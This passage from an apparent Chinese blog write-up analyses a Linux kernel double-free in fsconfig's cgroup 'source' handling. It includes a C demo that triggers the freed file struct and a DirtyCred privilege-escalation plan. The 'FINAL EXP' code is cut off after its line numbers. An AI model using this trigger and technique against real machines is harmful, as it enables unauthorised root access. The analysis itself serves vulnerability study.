href="#fsmount" class="headerlink" title="fsmount"></a>fsmount</h2><p>这个fsmount创建一个挂载实例后关联到一个新的文件描述符，这个新的文件描述符以<strong>O_PATH</strong>打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsmount</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ms_flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_fsmount, fsfd, flags, ms_flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面就是最后一步了，我们得到了一个挂载实例，下面就是将这个挂载实例<code>attach</code>到挂载点上。这一步使用<code>move_mount()</code>系统调用。</p><h2 id="move-mount"><a href="#move-mount" class="headerlink" title="move_mount"></a>move_mount</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">move_mount</span><span class="hljs-params">(<span class="hljs-type">int</span> from_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *from_pathname,</span><br><span class="hljs-params">     <span class="hljs-type">int</span> to_dfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *to_pathname,</span><br><span class="hljs-params">     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br><span class="hljs-keyword">return</span> syscall(__NR_move_mount,<br>       from_dfd, from_pathname,<br>       to_dfd, to_pathname, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x03：漏洞分析"><a href="#0x03：漏洞分析" class="headerlink" title="0x03：漏洞分析"></a>0x03：漏洞分析</h1><p>再来看一眼<code>fs_parameter</code>这个结构体，问题出在中间这个<code>union</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_parameter</span> &#123;</span><br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>              *key;           <span class="hljs-comment">/* Parameter name */</span><br>        <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">fs_value_type</span>      <span class="hljs-title">type</span>:</span><span class="hljs-number">8</span>;         <span class="hljs-comment">/* The type of value here */</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>                <span class="hljs-type">char</span>            *<span class="hljs-built_in">string</span>;<br>                <span class="hljs-type">void</span>            *blob;<br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">filename</span> *<span class="hljs-title">name</span>;</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span>     *<span class="hljs-title">file</span>;</span><br>        &#125;;<br>        <span class="hljs-type">size_t</span>  size;<br>        <span class="hljs-type">int</span>     dirfd;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>sys_fsconfig</code>中，当<strong>CMD</strong>为<strong>FSCONFIG_SET_FD</strong>时，会有如下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> FSCONFIG_SET_FD:<br>param.type = fs_value_is_file;<br>ret = -EBADF;<br>param.file = fget(aux);<br><span class="hljs-keyword">if</span> (!param.file)<br><span class="hljs-keyword">goto</span> out_key;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>此时<code>param.file</code>通过文件描述符指向一个文件实例</p><p>但是在接下来的调用链，<code>cgroup1_parse_param</code>中，当<code>key</code>为<code>source</code>时，会把<code>param-&gt;string</code>赋值给<code>fc-&gt;source</code>，</p><p>但是由于<code>param</code>结构体中，<code>string</code>和<code>file</code>是个<code>union</code>，两者只能存在一个，所以此处存在把文件实例传递给<code>fc-&gt;source</code>的风险</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">opt = fs_parse(fc, cgroup1_fs_parameters, param, &amp;result);<br><span class="hljs-keyword">if</span> (opt == -ENOPARAM) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来，若我们关闭文件描述符<code>fscontext_fd</code>，则会调用到<code>fscontext_fops</code>中的<code>fscontext_release</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fscontext_fops</span> =</span> &#123;<br>.read= fscontext_read,<br>.release= fscontext_release,<br>.llseek= no_llseek,<br>&#125;;<br></code></pre></td></tr></table></figure><p>在<code>fscontext_release</code>中会调用<code>put_fs_context</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fscontext_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span> =</span> file-&gt;private_data;<br><br><span class="hljs-keyword">if</span> (fc) &#123;<br>file-&gt;private_data = <span class="hljs-literal">NULL</span>;<br>put_fs_context(fc);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>put_fs_context</code>会释放<code>fc-&gt;source</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * put_fs_context - Dispose of a superblock configuration context.</span><br><span class="hljs-comment"> * @fc: The context to dispose of.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">put_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">super_block</span> *<span class="hljs-title">sb</span>;</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;root) &#123;<br>sb = fc-&gt;root-&gt;d_sb;<br>dput(fc-&gt;root);<br>fc-&gt;root = <span class="hljs-literal">NULL</span>;<br>deactivate_super(sb);<br>&#125;<br><br><span class="hljs-keyword">if</span> (fc-&gt;need_free &amp;&amp; fc-&gt;ops &amp;&amp; fc-&gt;ops-&gt;<span class="hljs-built_in">free</span>)<br>fc-&gt;ops-&gt;<span class="hljs-built_in">free</span>(fc);<br><br>security_free_mnt_opts(&amp;fc-&gt;security);<br>put_net(fc-&gt;net_ns);<br>put_user_ns(fc-&gt;user_ns);<br>put_cred(fc-&gt;cred);<br>put_fc_log(fc);<br>put_filesystem(fc-&gt;fs_type);<br>kfree(fc-&gt;source);<br>kfree(fc);<br>&#125;<br></code></pre></td></tr></table></figure><p>若之前将<code>fc-&gt;source</code>指向一个文件实例，那么在此处释放后，该实例事实上还在使用中</p><p>可以关闭与之关联的文件描述符造成<code>double free</code></p><p>可以写个小demo测试一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> tmp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fscontext_fd;<br>    fscontext_fd = syscall(__NR_fsopen, <span class="hljs-string">&quot;cgroup&quot;</span>, FSOPEN_CLOEXEC);<br>    <span class="hljs-keyword">if</span> (fscontext_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;fsopen failed!&quot;</span>);<br><br>    <span class="hljs-type">int</span> fd_null = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd_null &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open /dev/null failed!&quot;</span>);<br><br>    syscall(__NR_fsconfig, fscontext_fd, FSCONFIG_SET_FD, <span class="hljs-string">&quot;source&quot;</span>, <span class="hljs-literal">NULL</span>, fd_null);<br>    close(fscontext_fd);<br><br>    tmp = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDONLY);<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在<code>put_fs_context</code>中是释放的是<code>0xffff888005f59c00</code>的堆块</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/f04ac0e24d6468fdac631d981d05e09.png"></p><p>在接下打开&#x2F;<code>dev/ptmx</code>过程中，发现重新申请回来的file结构体和之前的释放的堆块相同</p><p>但是此时<code>fd_null</code>并未关闭，于是，此时是<code>/dev/null</code>和&#x2F;<code>dev/ptmx</code>共用一个file</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/b05d5310f1ef2e669c3cfa814e69ce4.png"></p><h1 id="0x04：漏洞利用——dirtycred！！！"><a href="#0x04：漏洞利用——dirtycred！！！" class="headerlink" title="0x04：漏洞利用——dirtycred！！！"></a>0x04：漏洞利用——dirtycred！！！</h1><p>于此处实践一下<strong>dirtycred</strong>这一手法</p><p>根据漏洞，可以造成一个<code>file</code>凭证的<code>UAF</code>，步骤如下：</p><ol><li>当在用户态打开一个文件时，内核会分配一个<code>file</code>结构体，用来保存文件的信息</li><li>利用<code>fsopen</code>打开一个文件系统，使用<code>fsconfig</code>可以指定已经打开的文件和文件系统</li><li><code>fsconfig</code>中存在参数解析漏洞，倒是关闭文件系统时，会造成<code>file</code>结构体的释放，形成<strong>UAF</strong>漏洞</li><li>接下来不断得打开文件，可以分配到被释放得<code>file</code>结构，此时，存在两个文件描述符指向同一个<code>file</code>结构体</li></ol><p>下图来自blingbling师傅的blog呜呜</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405163727.png"></p><p>根据<strong>dirtycred</strong>的思路，在文件检查和实际写入间隙，将<code>file</code>结构体替换成无写入权限的特权文件</p><p>一般来说，<code>write</code>的函数调用链为</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SCSS"><span class="hljs-built_in">sys_write</span>()<br><span class="hljs-built_in">ksys_write</span>()<br><span class="hljs-built_in">vfs_write</span>()<br>new_sync_write <br>call_write_iter <br>file-&gt;f_op-&gt;write_iter<br></code></pre></td></tr></table></figure><p><strong>vfs_write</strong></p><p>在<code>vfs_write</code>中，会check将要写入的文件是否具有可写入权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<span class="hljs-comment">//check</span><br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<span class="hljs-comment">//check</span><br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>ret = rw_verify_area(WRITE, file, pos, count);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>count =  MAX_RW_COUNT;<br>file_start_write(file);<br><span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>ret = new_sync_write(file, buf, count, pos);<br><span class="hljs-keyword">else</span><br>ret = -EINVAL;<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>fsnotify_modify(file);<br>add_wchar(current, ret);<br>&#125;<br>inc_syscw(current);<br>file_end_write(file);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>在不同的文件系统中，<code>file-&gt;f_op-&gt;write_iter</code>不同，常见中的<strong>ext4</strong>系统中对应的是<code>ext4_buffered_write_iter</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ext4_buffered_write_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">inode</span> =</span> file_inode(iocb-&gt;ki_filp);<br><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_flags &amp; IOCB_NOWAIT)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>inode_lock(inode);<span class="hljs-comment">//此处便会对写入的进程加锁，同一时间内只允许一个进程进行写入操作</span><br>ret = ext4_write_checks(iocb, from);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>ret = generic_perform_write(iocb, from);<br><br>out:<br>inode_unlock(inode);<br><span class="hljs-keyword">if</span> (unlikely(ret &lt;= <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">return</span> generic_write_sync(iocb, ret);<br>&#125;<br></code></pre></td></tr></table></figure><p>下图也是来自blingbling师傅的blog</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133530.png"></p><p>但是，这个时间窗口非常小。且一般常用的<strong>userfaultfd</strong>在<strong>5.11</strong>版本及以后，无法在<strong>非root</strong>权限下使用，而代替userfaultfd的<strong>FUSE</strong>笔者还8会。便采用了向文件写入大量data这一方法——因为文件系统不允许两个进程同时写同一个文件，假设进程A&#x2F;B同时对同一文件写入，进程A先获取锁，写入大量数据（1G文件大概要写2-3秒，可以说是很长的时间窗口了），进程B在完成check后等待获取锁，那么这中间的时间就可以替换<code>file</code>结构体</p><p>下图还是来自blingbling师傅的blog</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240406133603.png"></p><p><strong>PS1：fsopen和fsconfig只用在root权限下才可使用，所以需要开辟新的命名空间来绕过该限制</strong></p><p><strong>PS2：对将要打开的普通权限文件创建一个链接</strong></p><p>在<code>ksys_write</code>中，会调用到<code>fdget_pos</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">ksys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd);<br><span class="hljs-type">ssize_t</span> ret = -EBADF;<br>.......<br></code></pre></td></tr></table></figure><p><code>fdget_pos</code>是<code>__fdget_pos</code>的套娃</p><p>如果<code>file_needs_f_pos_lock(file)</code>返回值为<code>true</code>，那么这个线程就会被上锁，但是此时还没过<code>file</code>权限check呢，这显然是我们不想看到的，那该怎么办呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __fdget_pos(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> v = __fdget(fd);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span> =</span> (<span class="hljs-keyword">struct</span> file *)(v &amp; ~<span class="hljs-number">3</span>);<br><br><span class="hljs-keyword">if</span> (file &amp;&amp; file_needs_f_pos_lock(file)) &#123;<br>v |= FDPUT_POS_UNLOCK;<br>mutex_lock(&amp;file-&gt;f_pos_lock);<br>&#125;<br><span class="hljs-keyword">return</span> v;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到如果<code>file-&gt;f_mode</code>带有 <strong>FMODE_ATOMIC_POS</strong>这个标志，那这个返回值为1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Try to avoid f_pos locking. We only need it if the</span><br><span class="hljs-comment"> * file is marked for FMODE_ATOMIC_POS, and it can be</span><br><span class="hljs-comment"> * accessed multiple ways.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Always do it for directories, because pidfd_getfd()</span><br><span class="hljs-comment"> * can make a file accessible even if it otherwise would</span><br><span class="hljs-comment"> * not be, and for directories this is a correctness</span><br><span class="hljs-comment"> * issue, not a &quot;POSIX requirement&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">file_needs_f_pos_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-keyword">return</span> (file-&gt;f_mode &amp; FMODE_ATOMIC_POS) &amp;&amp;<br>(file_count(file) &gt; <span class="hljs-number">1</span> || file-&gt;f_op-&gt;iterate_shared);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>what is FMODE_ATOMIC_POS?</strong></p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240405214853.png" style="zoom:50%;" /><p>源码搜索发现<code>open</code>中也调用到了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-comment">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span><br><span class="hljs-keyword">if</span> (S_ISREG(inode-&gt;i_mode) || S_ISDIR(inode-&gt;i_mode))<br>f-&gt;f_mode |= FMODE_ATOMIC_POS;<br>......<br></code></pre></td></tr></table></figure><p>那<strong>S_ISREG</strong>和<strong>S_ISDIR</strong>又为何物？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISLNK(m)(((m) &amp; S_IFMT) == S_IFLNK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISREG(m)(((m) &amp; S_IFMT) == S_IFREG)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISDIR(m)(((m) &amp; S_IFMT) == S_IFDIR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISCHR(m)(((m) &amp; S_IFMT) == S_IFCHR)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISBLK(m)(((m) &amp; S_IFMT) == S_IFBLK)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISFIFO(m)(((m) &amp; S_IFMT) == S_IFIFO)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S_ISSOCK(m)(((m) &amp; S_IFMT) == S_IFSOCK)</span><br><span class="hljs-comment">//S_ISLNK(st_mode)：是否是一个连接</span><br><span class="hljs-comment">//S_ISREG(st_mode)：是否是一个常规文件</span><br><span class="hljs-comment">//S_ISDIR(st_mode)：是否是一个目录</span><br><span class="hljs-comment">//S_ISCHR(st_mode)：是否是一个字符设备</span><br><span class="hljs-comment">//S_ISBLK(st_mode)：是否是一个块设备</span><br><span class="hljs-comment">//S_ISFIFO(st_mode)：是否 是一个FIFO文件.</span><br><span class="hljs-comment">//S_ISSOCK(st_mode)：是否是一个SOCKET文件</span><br></code></pre></td></tr></table></figure><p>所以只要我们打开的文件不是目录或者常规文件就可以规避掉这个锁</p><h2 id="FINAL-EXP"><a href="#FINAL-EXP" class="headerlink" title="FINAL EXP"></a>FINAL EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 